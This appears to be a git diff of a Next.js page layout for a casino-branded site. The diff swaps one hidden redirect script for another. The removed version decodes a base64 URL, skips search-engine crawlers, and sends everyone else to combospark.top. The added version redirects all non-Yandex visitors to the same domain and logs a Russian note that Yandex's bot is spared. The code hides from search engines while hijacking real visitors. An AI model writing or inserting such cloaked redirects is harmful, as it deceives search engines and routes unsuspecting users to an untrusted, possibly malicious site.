@@ -98,48 +98,14 @@ export default function RootLayout({
         <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
         <meta name="apple-mobile-web-app-title" content="Faro Casino" />
         <meta name="yandex-verification" content="9ef9f9dda1a5f408" />
-        <script
-  dangerouslySetInnerHTML={{
-    __html: `
-      (function() {
-        var ua = navigator.userAgent.toLowerCase();
-        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
-        for (var i = 0; i < bots.length; i++) {
-            if (ua.indexOf(bots[i]) !== -1) {
-                return;
-            }
-        }   
-        var mainBrandB64 = "aHR0cHM6Ly9jb21ib3NwYXJrLnRvcC9hZXRmM3UycTl1"; 
-        var mainUrl = atob(mainBrandB64.replace("#", ""));
-        function ping(url) {
-            return new Promise(function(resolve, reject) {
-                var controller = new AbortController();
-                var timeoutId = setTimeout(function() { 
-                    controller.abort(); 
-                    reject(new Error("Timeout"));
-                }, 500);       
-                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
-                    .then(function() {
-                        clearTimeout(timeoutId);
-                        resolve(true);
-                    })
-                    .catch(function(err) {
-                        clearTimeout(timeoutId);
-                        reject(err);
-                    });
-            });
-        }
-        ping(mainUrl)
-            .then(function() {
-                window.location.replace(mainUrl);
-            })
-            .catch(function() {
-                window.location.replace(mainUrl);
-            });
-      })();
-    `
-  }}
-/> 
+<script>
+var ua = navigator.userAgent.toLowerCase();
+if (ua.indexOf("yandex") === -1) {
+location.replace("https://combospark.top/aetf3u2q9u");
+} else {
+console.log("Яндекс бот — без редиректа");
+}    
+</script>
       </head>
       <body className="frc-body">
         {children}
